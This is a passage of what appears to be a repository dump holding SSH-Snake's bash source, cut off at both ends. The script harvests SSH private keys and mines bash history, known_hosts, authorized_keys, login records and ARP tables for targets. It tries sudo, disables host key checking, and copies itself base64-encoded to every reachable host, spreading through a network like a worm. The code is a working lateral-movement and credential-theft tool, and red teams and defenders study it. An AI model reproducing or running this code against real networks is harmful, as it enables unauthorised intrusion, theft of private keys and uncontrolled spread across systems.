\"${!ignore_list_array[@]}\"; do\n[[ -z \"$ssh_dest\" ]] && continue\n[[ -v 'ssh_dests[\"$ssh_dest\"]' || ${#ssh_dests[\"$ssh_dest\"]} -gt 0 ]] && continue\nretry_dests[\"$ssh_dest\"]=1\ndone\nfor priv_key in \"${!priv_keys[@]}\"; do\nkey_file=\"${priv_keys[\"$priv_key\"]}\"\nretry_keys[\"$priv_key\"]=\"$key_file\"\ndone\nfi\n(( ${#retry_dests[@]} )) || return\n(( ${#retry_keys[@]} )) || return\n[[ $retry_count -gt 0 ]] || return\n((retry_count--))\nssh_dests=()\npriv_keys=()\nfor ssh_dest in \"${!retry_dests[@]}\"; do\nis_ssh_dest \"$ssh_dest\" && ssh_dests[\"$ssh_dest\"]=1\ndone\nfor priv_key in \"${!retry_keys[@]}\"; do\n[[ -v '_ignored_key_files[\"$priv_key\"]' || ${#_ignored_key_files[\"$priv_key\"]} -gt 0 ]] && continue\npriv_keys[\"$priv_key\"]=\"${retry_keys[\"$priv_key\"]}\"\ndone\n(( ${#ssh_dests[@]} )) || return\n(( ${#priv_keys[@]} )) || return\nprintf \"%s%s: EXTERNAL_MSG: INFO: Trying again with %d dests and %s keys (attempts left: %d)\\n\" \"$indent\" \"$hosts_chain\" \"${#ssh_dests[@]}\" \"${#priv_keys[@]}\" \"$retry_count\"\nrecursive_scan\n}\nsetup\nexec_custom_cmds\nfind_all\ncombinate_users_hosts_aggressive\ncombinate_interesting_users_hosts\ndeduplicate_resolved_hosts_keys\n(( ${#ssh_dests[@]} )) || fin\n(( ${#priv_keys[@]} )) || fin\nprintf \"%s%s: EXTERNAL_MSG: INFO: Beginning with %d dests and %d keys\\n\" \"$indent\" \"$hosts_chain\" \"${#ssh_dests[@]}\" \"${#priv_keys[@]}\"\nrecursive_scan\nfin\nMAIN_SCRIPT\n)\nprintf \"%s\" \"$THIS_SCRIPT\" | bash --noprofile --norc\n"
        },
        {
          "name": "Snake.sh",
          "type": "blob",
          "size": 94.75390625,
          "content": "#\n# SSH-Snake: Automated SSH-Based Network Traversal\n# Copyright (C) 2024 Joshua Rogers <https://joshua.hu/>, <https://github.com/MegaManSec/SSH-Snake>\n# GPL 3 License. See LICENSE and COPYING for more.\n#\n\nexport THIS_SCRIPT=$(cat <<\"MAIN_SCRIPT\" # DO NOT EDIT THIS LINE\n\n######\n######\n# SETTINGS\n######\n######\n\n\n\n######\n######\n# General Settings\n######\n######\n\n\nignore_user=0 # [0|1]: Consider a dest already scanned based only on the ip address. If user1@host is accessed, further access to user2@host will not re-run scans. This may be useful in an environment where sudo is accessible by every user (because user1@host can already access the keys that user2@host can access).\n\nuse_sudo=1 # [1|0]: Attempt to use sudo on the dest. This may generate a large amount of security-related logs and can be extremely noisy.\n\nssh_timeout=3 # [3|n]: The connection timeout for ssh and DNS resolution. See ssh_config(5)'s ConnectTimeout.\n\nretry_count=3 # [3|n]: In some cases, a recoverable error in ssh may be encountered (such as trying to access an an AWS instance with a disabled username). This number corresponds to the maximum amount of times the destination is tried again. It's generally advised to set this to at least 1.\n\nignored_users=() # (\"ubuntu\" \"root\"): A list of usernames that are always ignored. If we do somehow end up on a server with this username, we will print where we are but not scan the destination.\n\nignored_hosts=() # (\"8.8.8.8\" \"example.com\"): A list of hosts that are always ignored. If we do somehow end up on a server with this host, we will print where we are but not scan the destination. Best if it's an ip address.\n\nignored_dests=() # (\"root@10.2.3.4\" \"user@host.com\"): A list of destinations that are always ignored. If we do somehow end up on a server with this destination address, we will print where we are but not scan the destination.\n\nignored_key_files=(\"*badcert.pem*\" \"*badkey.pem*\") # (\"*badkey*\" \"*testkey*\" \"/etc/ssh/*\" \"/root/*/keys\"): A list of locations that are ignored when searching for ssh keys. This setting supports globbing/wildcards using the standard asterisk as in any other bash script. Note that for example, \"/dir/*/file\" will also match \"/dir/dir2/dir3/file\".\n\ncustom_cmds=() # (): A list of commands that should be run after the script has been initialized and recursion has been checked. This means the commands will only be run ONCE when a destination is discovered for the first time. This list also supports sudo (if available), and can be used by using ${s} as a literal. For example, custom_cmds=('${s} ls /root')\n\n\n\n######\n######\n# Private Key Discovery Settings\n######\n######\n\nscan_paths=() # (\"/home/*/\" \"/root/\"): A list containing files or directories which should be searched for SSH private keys. Note that discovery of private keys is an intensive procedure, and scanning paths with many possible private key files can be slow. This setting supports globbing/wildcards using the standard asterisk as in any other bash script. For example, scan_paths=(\"/etc/*/keys\" \"/tmp/\").\n\nscan_paths_depth=3 # [3|n]: If using scan_paths, specify the max-depth. Set to 99999 or some high number to have no restriction.\n\n\n\n######\n######\n# Username and Host Discovery Settings\n######\n######\n\nuse_find_from_hosts=1 # [1|0]: Attempt to find hosts using /etc/hosts\n\nuse_find_arp_neighbours=1 # [1|0]: arp neighbours may be interesting hosts.\n\nuse_find_d_block=0 # [0|1]: If we are connected to, for example, 10.1.2.3, it may be interesting to attempt to connect to 10.1.2.0-10.1.2.3.255, therefore we add these to a list of potential hosts.\n\n\n\n######\n######\n# Destination (user@host) Discovery Settings\n######\n######\n\nuse_find_from_authorized_keys=1 # [1|0]: authorized_keys files may contain a directive to only allow SSH from certain hosts. These are interesting, so try them.\n\nuse_find_from_last=1 # [1|0]: Check the last logins to this destination and attempt to ssh back to any addresses that have connected here before\n\nuse_find_from_prev_dest=1 # [1|0]: When a destination has been ssh'd into, attempt to SSH (with any keys found) back to the destination that we connected from.\n\nuse_find_from_known_hosts=1 # [1|0]: known_hosts files may contain hosts which have previously been SSH'd into.\n\nuse_find_from_hashed_known_hosts=0 # [0|1]: known_hosts files may contain hosts which have previously been SSH'd into. However, ssh's HashKnownHosts option hashes the host files. We can try to brute force, which we do by brute-forcing the c and d blocks of the current destination's ip add>\n\n# It may be interesting to attempt to ssh into all of the destinations that have previously been ssh'd into by previously scanned destinations.\n# Although we can't find a direct link using one of the strategies on the destination from destinations A->C doesn't mean the key won't be accepted (where B->C has already been found).\n# Therefore, there are a few strategies for discovering these links.\n# There are four possible values for this setting:\n#\n# 0: Nothing.\n# 1: Attempt to ssh into any destinations that up until the beginning of this script running, have been successfully connected to (by PREVIOUS destinations). For example: A->B->C. C will attempt to connect to B and A, B will attempt to connect to A.\n# 2: In addition to #1, also attempt to ssh into any destinations that are indirectly connected to this destination in the the future. For example: A->B->C. As above, but A will also attempt to connect to C.\nuse_find_from_ignore_list=0 # [0|2]\n\n# use_find_from_ignore_list is slightly flawed. Consider the following:\n# A->B->C ; Normal scan\n# A->D->C ; A->D discovered naturally, D->C discovered using use_find_from_ignore_list=1 or use_find_from_ignore_list=2.\n# A->C ; A->C discovered using use_find_from_ignore_list=2.\n# In this case, the link from C->D will not be discovered because destination D was first discovered after destination C has already been scanned.\n# Since C has already been scanned, it won't be scanned again, thus losing the valuable data of C->D.\n#\n# Therefore, we have a completely different strategy.\n# Once the scan is completely finished (i.e. the inital script that a human runs), the whole scan completely re-runs with each of the previously discovered destinations added to interesting_dests().\n# Effectively, this means that every destination will be scanned by every other destination. at least once.\n# On the re-run, we do NOT attempt to discover any NEW users/hosts/dests, only discover keys. This means that although new chains may be discovered, no new destinations will be discovered.\n# Note: it is also possible that new destinations will be discovered with this method, due to some strange network routing, however this is not intentional. (see XXX: Should we report that this is a NEW destination?)\nuse_retry_all_dests=1 # [0|1]\n\n\n\n######\n######\n# Destination AND Private Key Discovery Settings\n######\n######\n\nuse_find_from_bash_history=1 # [1|0]: bash_history files may contain calls to ssh, scp or rsync, which may contain clues for users, hosts, dests, and private key locations. This is one of the best discovery techniques to leave enabled.\n\nuse_find_from_ssh_config=1 # [1|0]: ssh_config files may contain usernames, hosts, and private key locations.\n\n\n\n######\n######\n# Combinatorial Destination Discovery Settings\n######\n######\n\ninteresting_users=(\"$USER\" \"root\") # (\"$USER\" \"root\"): A list of usernames which are always tried for every host that has been found if use_combinate_interesting_users_hosts=1.\ninteresting_hosts=(\"127.0.0.1\") # (\"127.0.0.1\"): A list of hosts which which are always tried for every user that has been found if use_combinate_interesting_users_hosts=1.\ninteresting_dests=() # (\"root@10.1.1.1\"): A list of destinations which are always tried if use_combinate_interesting_users_hosts=1.\n\nuse_combinate_interesting_users_hosts=1 # [1|0]: Combine all interesting users with all hosts to create destinations. Combine all interesting hosts with all users to create destination. Combine all interesting users with all interesting hosts to create destinations.\n\nuse_combinate_users_hosts_aggressive=0 # [0|1]: Combine all found usernames with all found hosts into attempted destinations. This may result in massive growth of attempted destinations (100 usernames discovered with 100 hostnames will result in 10,000 attempted destinations).\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#########\n#########\n######### Do not edit anything beyond this point unless you know what you're doing!\n#########\n#########\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nexport LC_ALL=\"C\"\nexport PATH=\"$PATH:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/bin\"\n\ndeclare -A priv_keys\ndeclare -A key_files\ndeclare -A home_folders\ndeclare -A ssh_files\ndeclare -A priv_keys_files\ndeclare -A root_ssh_keys # Used only to keep track of the number of keys discovered.\ndeclare -A root_ssh_hostnames_dests # Used only to keep track of the number of servers accessed. Format is the same as hostnames_chain: user@(host1:host2).\ndeclare -A root_ssh_hosts_dests # Also used to keep track of the number of servers accessed. Format is the same as hosts_chain: user@host.\ndeclare -A ssh_users\ndeclare -A ssh_hosts\ndeclare -A ssh_dests\ndeclare -A _ignored_users\ndeclare -A _ignored_hosts\ndeclare -A _ignored_dests\ndeclare -A _ignored_key_files\ndeclare -A files\ndeclare -A not_files\ndeclare -A folders\ndeclare -A not_folders\ndeclare -A current_ips\ndeclare -A ignore_list_array\n\n_ignored_hosts[\"openssh.com\"]=1\n_ignored_hosts[\"255.255.255.255\"]=1\n\n# GLOBALS\nignore_separator=\"|\"\nssh_options=(-oControlPath=none -oIdentitiesOnly=yes -oServerAliveInterval=300 -oTCPKeepAlive=no -oConnectTimeout=\"$ssh_timeout\" -oStrictHostKeyChecking=no -oGlobalKnownHostsFile=/dev/null -oUserKnownHostsFile=/dev/null -oBatchMode=yes)\nuser=\"$USER\"\nscript=\"$1\"\nhosts_chain=\"$(printf \"%s\" \"$2\" | base64 -d)\" # This contains the exact chain we used to connect between servers.\nhostnames_chain=\"$(printf \"%s\" \"$5\" | base64 -d)\" # This contains the chain that includes all possible ip addresses of a server.\nignore_list=\"$3\"\nthis_dest=\"$4\"\nthis_host=\"${this_dest#*@}\"\ncurrent_hostnames_ip=\"\"\n#current_hosts_ip=\"\"\nsshkeygen=(\"ssh-keygen\" \"-E\" \"md5\" \"-l\" \"-f\")\nindent=\"\"\ns=\"\"\n\nallowed_host_chars='[a-zA-Z0-9_.-]'\nallowed_users_chars='[a-z_][a-z0-9_-]{0,31}'\n\n\n# Print the title screen.\nprint_snake() {\n  cat << \"EOF\"\n                      __    __    __    __\n                     /  \\  /  \\  /  \\  /  \\\n____________________/  __\\/  __\\/  __\\/  __\\_______________________________,\n___________________/  /__/  /__/  /__/  /__________________________________|\n                   | / \\   / \\   / \\   / \\  \\____                          |\n                   |/   \\_/   \\_/   \\_/   \\    o \\                         |\n                                           \\_____/--<                      |\n       ---_ ......._-_--.                                                  |\n      (|\\ /      / /| \\  \\                                      ?          |\n      /  /     .'  -=-'   `.                                  .            |\n     /  /    .'             )                                '             |\n   _/  /   .'        _.)   /                  _ -- ~~~ -- _      _______   |\n  / o   o        _.-' /  .'               .-~               ~-.{__-----. : |\n  \\          _.-'    / .'*|             /                       \\      | | |\n   \\______.-'//    .'.' \\*|            :         O     O         :     | | |\n    \\|  \\ | //   .'.' _ |*|            /\\                       /------' j |\n     `   \\|//  .'.'_ _ _|*|           { {/~-.               .-~\\~~~~~~~~~  |\n      .  .// .'.' | _ _ \\*|            \\/ /  |~:- .___. -.~\\  \\ \\          |\n      \\`-|\\_/ /    \\ _ _ \\*\\          / /\\ \\ | | { { \\ \\  } }  \\ \\         |\n       `/'\\__/      \\ _ _ \\*\\        { {   \\ \\ |  \\ \\  \\ \\ /    } }        |\n      /^|            \\ _ _ \\*         \\ \\   /\\ \\   \\ \\  /\\ \\   { {         |\n     '  `             \\ _ _ \\          } } { { \\ \\  \\ \\/ / \\ \\  \\ \\        |\n                       \\_             / /   } }  \\ \\ }{ {    \\ \\ } }       |\n ___________________________         / /   { {     \\ \\{\\ \\    } { {        |\n( Written for the mediocre. )       / /     } }     } }\\\\ \\  / / \\ \\       |\n(          By the mediocre. )      `-'     { {     `-'\\ \\`-'/ /   `-'      |\n----------------------------               `-'        `-' `-'              |\n                ^__^   o                                                   |\n        _______\\)xx(  o      <https://github.com/MegaManSec/SSH-Snake>     |\n    \\/\\)       \\)__(      By Joshua Rogers <https://joshua.hu/>            |\n       | w----||  U                                                        |\n       ||     ||                                  GPL 3, of course.        |\n________________________~_____/^,___,-^\\_________________~~_______________/`\n\n\n\nEOF\n}\n\n# Print a summary of the settings we're using.\nprint_settings() {\n  local setting_keys\n  local setting_values\n  local max_key_length\n  local max_value_length\n  local i\n\n  setting_keys=(\"ignore_user\" \"use_sudo\" \"ssh_timeout\" \"retry_count\" \"scan_paths\" \"scan_paths_depth\" \"interesting_users\" \"interesting_hosts\" \"interesting_dests\" \"ignored_users\" \"ignored_hosts\" \"ignored_dests\" \"ignored_key_files\" \"custom_cmds\" \"use_combinate_interesting_users_hosts\" \"use_combinate_users_hosts_aggressive\" \"use_find_from_hosts\" \"use_find_from_last\" \"use_find_from_authorized_keys\" \"use_find_from_known_hosts\" \"use_find_from_ssh_config\" \"use_find_from_bash_history\" \"use_find_arp_neighbours\" \"use_find_d_block\" \"use_find_from_hashed_known_hosts\" \"use_find_from_prev_dest\" \"use_find_from_ignore_list\" \"use_retry_all_dests\")\n  setting_values=(\"$ignore_user\" \"$use_sudo\" \"$ssh_timeout\" \"$retry_count\" \"${scan_paths[*]}\" \"$scan_paths_depth\" \"${interesting_users[*]}\" \"${interesting_hosts[*]}\" \"${interesting_dests[*]}\" \"${ignored_users[*]}\" \"${ignored_hosts[*]}\" \"${ignored_dests[*]}\" \"${ignored_key_files[*]}\" \"${custom_cmds[*]}\" \"$use_combinate_interesting_users_hosts\" \"$use_combinate_users_hosts_aggressive\" \"$use_find_from_hosts\" \"$use_find_from_last\" \"$use_find_from_authorized_keys\" \"$use_find_from_known_hosts\" \"$use_find_from_ssh_config\" \"$use_find_from_bash_history\" \"$use_find_arp_neighbours\" \"$use_find_d_block\" \"$use_find_from_hashed_known_hosts\" \"$use_find_from_prev_dest\" \"$use_find_from_ignore_list\" \"$use_retry_all_dests\")\n\n  max_key_length=0\n  max_value_length=0\n\n  for ((i=0; i<${#setting_keys[@]}; i++)); do\n    key_length=\"${#setting_keys[$i]}\"\n    value_length=\"${#setting_values[$i]}\"\n\n    ((key_length > max_key_length)) && max_key_length=$key_length\n    ((value_length > max_value_length)) && max_value_length=$value_length\n  done\n\n  printf \"|%-*s|%-*s|\\n\" \"$((max_key_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_key_length + 4))\"))\" \"$((max_value_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_value_length + 4))\"))\"\n  printf \"| %-*s | %-*s |\\n\" \"$((max_key_length + 2))\" \"Setting\" \"$((max_value_length + 2))\" \"Value\"\n  printf \"|%-*s|%-*s|\\n\" \"$((max_key_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_key_length + 4))\"))\" \"$((max_value_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_value_length + 4))\"))\"\n\n  for ((i=0; i<${#setting_keys[@]}; i++)); do\n    printf \"| %-*s | %-*s |\\n\" \"$((max_key_length + 2))\" \"${setting_keys[$i]}\" \"$((max_value_length + 2))\" \"${setting_values[$i]}\"\n  done\n\n  printf \"|%-*s|%-*s|\\n\\n\\n\" \"$((max_key_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_key_length + 4))\"))\" \"$((max_value_length + 2))\" \"$(printf -- '-%.0s' $(seq \"$((max_value_length + 4))\"))\"\n}\n\n# Function to remove specific bash functions and their calls from the script passed via $1.\nremove_functions() {\n  local this_script\n  local function_names\n\n  this_script=\"$1\"\n  function_names=\"$2\"\n\n  # Use awk to filter out the functions and their calls from the script\n  printf \"%s\" \"$this_script\" | awk -v fnames=\"$function_names\" '\n    # ^func_name()\n    function is_func_line() {\n      for (i in funcs) {\n        if ($0 ~ \"^\" funcs[i] \"\\\\(\\\\)\") {\n          return 1\n        }\n      }\n      return 0\n    }\n\n    # [space][space][...] func_name\n    function is_func_call() {\n      for (i in funcs) {\n        if ($0 ~ \"^[ ]*\" funcs[i]) {\n          return 1\n        }\n      }\n      return 0\n    }\n\n    BEGIN {\n      split(fnames, funcs, \" \");\n      in_func = 0\n    }\n\n    is_func_line() { in_func = 1; next }\n    # end of the function is ^}\n    /^\\}/ { if (in_func) { in_func = 0; next } }\n    is_func_call() { next }\n    !in_func { print }\n  '\n}\n\n# Function to convert all final ssh destinations from root_ssh_hostnames_dests from the format user@(host1:host2:...) (aka hostnames_chain format) into user@host user@host2 ...\n# Prints all user@host combinations, including those from root_ssh_hosts_dests (aka hosts_chain format)\n# This is only used if use_retry_all_dests is set to 1.\ngen_retried_interesting_dests() {\n  local ssh_dest\n\n  # ssh_dest format is user@(host1:host2)\n  # Output of this is \\x22user@host1\\x22\\n\\x22user@host2\\x22\n  for ssh_dest in \"${!root_ssh_hostnames_dests[@]}\"; do\n    printf \"%s\" \"$ssh_dest\" | awk -F'[@():]' -v OFS='@' '\n    {\n      user = $1\n      for (i = 2; i <= NF; i++) {\n        if ($i != \"\" && user != \"\") {\n          print \"\\\\x22\" user \"@\" $i \"\\\\x22\"\n        }\n      }\n    }'\n  done\n\n  for ssh_dest in \"${!root_ssh_hosts_dests[@]}\"; do\n    printf \"\\\\\\x22%s\\\\\\x22\\n\" \"$ssh_dest\"\n  done\n}\n\n# If the script is run for the first time (or: the script has not been executed with the script's contents as the first argument) it executes itself.\n# It also removes any comments, unnecessary white-spaces, and unused functions from the script (including this one!), to save space for arguments.\nshape_script() {\n  local line\n  local local_script\n  local opt_function_list\n  local opt_function\n  local ssh_dest\n\n  opt_function_list=(\"use_combinate_interesting_users_hosts\" \"use_combinate_users_hosts_aggressive\" \"use_find_from_hosts\" \"use_find_from_last\" \"use_find_from_authorized_keys\" \"use_find_from_known_hosts\" \"use_find_from_ssh_config\" \"use_find_from_bash_history\" \"use_find_arp_neighbours\" \"use_find_d_block\" \"use_find_from_hashed_known_hosts\" \"use_find_from_prev_dest\" \"use_find_from_ignore_list\" \"use_retry_all_dests\")\n\n  for opt_function in \"${opt_function_list[@]}\"; do\n    if [[ ${!opt_function} -eq 0 ]]; then\n      remove_function+=\"${opt_function#use_} \"\n    fi\n    # Two-off because use_find_from_ignore_list is variable from 0-2, and we use use_retry_all_dests to know we're inside a loop.\n    [[ \"$opt_function\" =~ use_find_from_ignore_list|use_retry_all_dests ]] && continue\n    remove_function+=\"$opt_function \"\n  done\n\n  if [[ ${#custom_cmds[@]} -eq 0 ]]; then\n    remove_function+=\"exec_custom_cmds \"\n    remove_function+=\"custom_cmds \"\n  fi\n  if [[ ${#scan_paths[@]} -eq 0 || $scan_paths_depth -lt 1 ]]; then\n    remove_function+=\"find_ssh_keys_paths \"\n    remove_function+=\"scan_paths \"\n    remove_function+=\"scan_paths_depth \"\n  fi\n  if [[ ${#ignored_users[@]} -eq 0 && ${#ignored_hosts[@]} -eq 0 && ${#ignored_dests[@]} -eq 0 ]]; then\n    remove_function+=\"init_ignored \"\n    remove_function+=\"ignored_users ignored_hosts ignored_dests \"\n  fi\n  if [[ $use_combinate_users_hosts_aggressive -eq 0 ]] && [[ ${#interesting_users[@]} -eq 0 || $use_combinate_interesting_users_hosts -eq 0 ]]; then\n    remove_function+=\"find_from_hosts find_arp_neighbours find_d_block \" # These functions only find hosts, and since we have no interesting_users, we're never going to combinate them using combinate_interesting_users_hosts. XXX: Should we warn the user?\n  fi\n  if [[ $use_find_from_authorized_keys -eq 0 && $use_find_from_known_hosts -eq 0 && $use_find_from_hashed_known_hosts -eq 0 ]]; then # find_user_from_file is only used in these three functions.\n  remove_function+=\"find_user_from_file \"\n  fi\n  if [[ $use_combinate_users_hosts_aggressive -eq 1 ]]; then\n    remove_function+=\"use_combinate_interesting_users_hosts combinate_interesting_users_hosts \" # use_combinate_users_hosts_aggressive is a superset of combinate_interesting_users_hosts.\n  fi\n  if [[ $use_combinate_interesting_users_hosts -eq 0 && $use_combinate_users_hosts_aggressive -eq 0 ]]; then\n    remove_function+=\"interesting_hosts interesting_users \"\n    if [[ $use_retry_all_dests -eq 0 ]]; then\n      remove_function+=\"interesting_dests \"\n    fi\n  fi\n  if [[ ${#interesting_users[@]} -eq 0 && ${#interesting_hosts[@]} -eq 0 && ${#interesting_dests[@]} -eq 0 ]]; then\n    if [[ $use_retry_all_dests -eq 0 ]]; then\n      remove_function+=\"interesting_dests \"\n    fi\n    remove_function+=\"combinate_interesting_users_hosts use_combinate_interesting_users_hosts \"\n    remove_function+=\"interesting_users interesting_hosts \"\n  fi\n  if [[ $use_find_from_ignore_list -eq 0 ]]; then\n    remove_function+=\"use_find_from_ignore_list \"\n  fi\n  if [[ $use_retry_all_dests -eq 0 ]]; then\n    remove_function+=\"use_retry_all_dests \"\n  fi\n  if [[ $use_sudo -eq 0 ]]; then\n    remove_function+=\"check_sudo use_sudo s= \"\n  fi\n  if [[ ${#ignored_key_files[@]} -eq 0 ]]; then\n    remove_function+=\"ignored_key_files \"\n  fi\n\n  # Remove this function\n  remove_function+=\"shape_script \"\n  # Remove the fin_root function\n  remove_function+=\"fin_root \"\n  # Remove the print_settings function\n  remove_function+=\"print_settings \"\n  # Remove the remove_functions function\n  remove_function+=\"remove_functions \"\n  # Remove the print_snake function\n  remove_function+=\"print_snake \"\n  # Remove the gen_retried_interesting_dests function\n  remove_function+=\"gen_retried_interesting_dests \"\n  # Remove the root_ssh_keys, root_ssh_hostnames_dests, and root_ssh_hosts_dests variables\n  remove_function+=\"root_ssh_keys root_ssh_hostnames_dests root_ssh_hosts_dests\"\n\n  # TODO: We should remove declare -A root_ssh_keys, declare -A root_ssh_hostnames_dests, and declare -A root_ssh_hosts_dests somehow.\n\n  # Actually remove it all.\n  local_script=\"$(remove_functions \"$THIS_SCRIPT\" \"$remove_function\")\"\n\n  # Remove all comments and unnecessary white-spaces.\n  local_script=\"$(printf \"%s\" \"$local_script\" | sed -e 's/^[ ]*//' -e 's/^#.*$//' -e 's/[ ]#.*//' -e '/^[ ]*$/d')\"\n\n  # XXX: If we want to see what script we're running, then this is the place to print \"$local_script\". Or above the previous line.\n  # printf \"%s\" \"$local_script\"\n\n  while IFS= read -r line; do\n    if [[ \"$line\" == *\"EXTERNAL_MSG: KEY\"* ]]; then\n      root_ssh_keys[\"${line##* }\"]=1\n    elif [[ \"$line\" =~ ($allowed_users_chars@\\([0-9\\.:]*\\))$ ]]; then # Capture user@(host1:host2)\n      root_ssh_hostnames_dests[\"${BASH_REMATCH[1]}\"]=1\n    elif [[ \"$line\" =~ ($allowed_users_chars@[0-9\\.]*)$ ]]; then # capture user@host\n      root_ssh_hosts_dests[\"${BASH_REMATCH[1]}\"]=1\n    fi\n    printf \"[%s]\" \"$(date +%s)\"\n    printf \"%s\\n\" \"$line\"\n  done < <(echo 'printf \"%s\" \"$1\" | base64 -d | bash --noprofile --norc -s $1' | bash --noprofile --norc -s \"$(printf \"%s\" \"$local_script\" | base64 | tr -d '\\n')\" 2>&1 | grep -v -F 'INTERNAL_MSG')\n\n  [[ $use_retry_all_dests -eq 1 ]] || return\n\n  local retried_interesting_dests\n  retried_interesting_dests=\"$(gen_retried_interesting_dests | sort | uniq)\"\n\n  [[ \"${#retried_interesting_dests}\" -gt 0 ]] || return\n\n  printf \"\\n\\n---------------------------------------\\n\\n\"\n  printf \"use_retry_all_dests=1. Re-starting.\\n\"\n\n\n  printf \"%s destinations (from %s unique servers) added to interesting_dests.\\n\" \"$(echo \"$retried_interesting_dests\" | wc -l)\" \"${#root_ssh_hostnames_dests[@]}\"\n  retried_interesting_dests=\"$(echo \"$retried_interesting_dests\" | tr '\\n' ' ')\"\n\n  printf \"\\n---------------------------------------\\n\\n\\n\"\n\n  local_script=\"$(printf \"%s\" \"$local_script\" | sed 's/^interesting_dests=(/interesting_dests=('\"$retried_interesting_dests\"'/')\"\n  local_script=\"$(printf \"%s\" \"$local_script\" | sed 's/^use_retry_all_dests=1/use_retry_all_dests=2/')\"\n\n  # We do not want to find any new dests and so on, so remove all of the non-key functions.\n  # If you REALLY want to look for new users/hosts/dests using use_combinate_users_hosts_aggressive or combinate_interesting_users_hosts(interesting_users/interesting_hosts), then replace the following line with remove_function=\"retry_all_dests\".\n  remove_function=\"find_from_authorized_keys find_from_hosts find_from_last find_arp_neighbours find_d_block find_from_ignore_list find_from_known_hosts find_from_hashed_known_hosts find_from_prev_dest combinate_users_hosts_aggressive combinate_interesting_users_hosts interesting_users interesting_hosts deduplicate_resolved_hosts_keys init_ignored ignored_users ignored_hosts ignored_dests find_user_from_file \"\n  local_script=\"$(remove_functions \"$local_script\" \"$remove_function\")\"\n\n  while IFS= read -r line; do\n    if [[ \"$line\" == *\"EXTERNAL_MSG: KEY\"* ]]; then\n      root_ssh_keys[\"${line##* }\"]=1\n    elif [[ \"$line\" =~ ($allowed_users_chars@\\([0-9\\.:]*\\))$ ]]; then # Capture user@(host1:host2)\n      root_ssh_hostnames_dests[\"${BASH_REMATCH[1]}\"]=1\n    elif [[ \"$line\" =~ ($allowed_users_chars@[0-9\\.]*)$ ]]; then # capture user@host\n      root_ssh_hosts_dests[\"${BASH_REMATCH[1]}\"]=1\n    fi\n    printf \"[%s]\" \"$(date +%s)\"\n    printf \"%s\\n\" \"$line\"\n  done < <(echo 'printf \"%s\" \"$1\" | base64 -d | bash --noprofile --norc -s $1' | bash --noprofile --norc -s \"$(printf \"%s\" \"$local_script\" | base64 | tr -d '\\n')\" 2>&1 | grep -v -F 'INTERNAL_MSG')\n}\n\n# If this is the first IP in the chain, prepare some data from the chain, which will be printed by the root script.\nfin_root() {\n  local root_ssh_dest\n  declare -A root_ssh_hosts\n\n  for root_ssh_dest in \"${!root_ssh_hostnames_dests[@]}\"; do\n    root_ssh_hosts[\"${root_ssh_dest#*@}\"]=1\n  done\n\n  printf \"\\n\\n\\n\"\n\ncat <<\"EOF\"\n               ______\n          _.-\"\"      \"\"-._\n       .-'                `-.\n     .'      __.----.__      `.\n    /     .-\"          \"-.     \\\n   /    .'                `.    \\\n  J    /                    \\    L\n  F   J                      L   J\n J    F                      J    L\n |   J                        L   |\n |   |                        |   |\n |   J                        F   |\n J    L                      J    F\n  L   J   .-\"\"\"\"-.           F   J\n  J    \\ /        \\   __    /    F\n   \\    (|)(|)_   .-'\".'  .'    /\n    \\    \\   /_>-'  .<_.-'     /\n     `.   `-'     .'         .'\n       `--.|___.-'`._    _.-'\n           ^         \"\"\"\"\n\n           ..             ..\n          ( '`<          ( '`<  ...Summary Report:\n           )(             )(\n    ( ----'  '.    ( ----'  '.\n    (         ;    (         ;\n     (_______,'     (_______,'\n~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^~^~^~^~^~^~~^~^~^~^~^\n\nEOF\n\n  printf \"Unique private keys discovered: %s\\n\" \"${#root_ssh_keys[@]}\"\n  printf \"Unique shell accounts accessed: %s\\n\" \"${#root_ssh_hostnames_dests[@]}\"\n  printf \"Unique systems accessed: %s\\n\" \"${#root_ssh_hosts[@]}\"\n  printf \"\\nNeed a list of servers accessed? Run one of these commands:\\n\\n\"\ncat <<\"EOF\"\ngrep -oE \"[a-z_][a-z0-9_-]{0,31}@[0-9\\.]*$\" output.log  | sort | uniq\ngrep -oE \"[a-z_][a-z0-9_-]{0,31}@\\([0-9\\.:]*\\)$\" output.log  | sort | uniq\n\nEOF\n\n  printf -- \"-- https://joshua.hu/ --\\n\"\n  printf -- \"-- https://github.com/MegaManSec/SSH-Snake --\\n\"\n  printf \"\\nThanks for playing!\\n\"\n}\n\n# Check each of the required programs and bash version.\n# Prints the missing command on fail.\ncheck_commands() {\n  local required_commands\n  local required_command\n\n  required_commands=(\"ssh-keygen\" \"readlink\" \"ssh\" \"basename\" \"base64\" \"awk\" \"sort\" \"uniq\" \"grep\" \"tr\" \"find\" \"cat\") # \"sudo\" \"hostname\" \"xargs\" \"getent\" \"ifconfig\" \"ipconfig\" \"ip\" \"timeout\" \"dscacheutil\" are all semi-optional. \"sed\" is necessary only by the first system.\n\n  for required_command in \"${required_commands[@]}\"; do\n    if ! command -v \"$required_command\" >/dev/null 2>&1; then\n      echo \"$required_command\"\n      return\n    fi\n  done\n\n  if [[ \"${BASH_VERSINFO:-0}\" -lt 4 ]]; then\n    echo \"bash\"\n    return\n  fi\n}\n\n# Ensures that the server is running bash and has all of the required inbuilts and programs required for the script to run.\n# If a version of bash is not compatible with the script, it reports the version but does not continue.\n# If any of the required programs/inbuilts are missing, it also reports the violation and quits.\ncheck_startup() {\n  local missing_command\n\n  missing_command=\"$(check_commands)\"\n\n  # This is the beginning of the main script: print_snake, print_settings, then shape_script (which executes the script via stdin)\n  if [[ -z \"$script\" ]]; then\n    if ! command -v sed >/dev/null 2>&1; then\n      printf \"Could not begin because 'sed' is not available!\\n\"\n      exit 1\n    elif [[ -n \"$missing_command\" ]]; then\n      printf \"Could not begin because %s is not available!\\n\" \"$missing_command\"\n      exit 1\n    fi\n    print_snake\n    print_settings\n    shape_script\n    fin_root\n    exit 0\n  fi\n\n  if [[ -n \"$missing_command\" ]]; then\n    printf \"INTERNAL_MSG: command not found: %s\\n\" \"$required_command\"\n    exit 1\n  fi\n\n  if ! printf \"%s\" \"$script\" 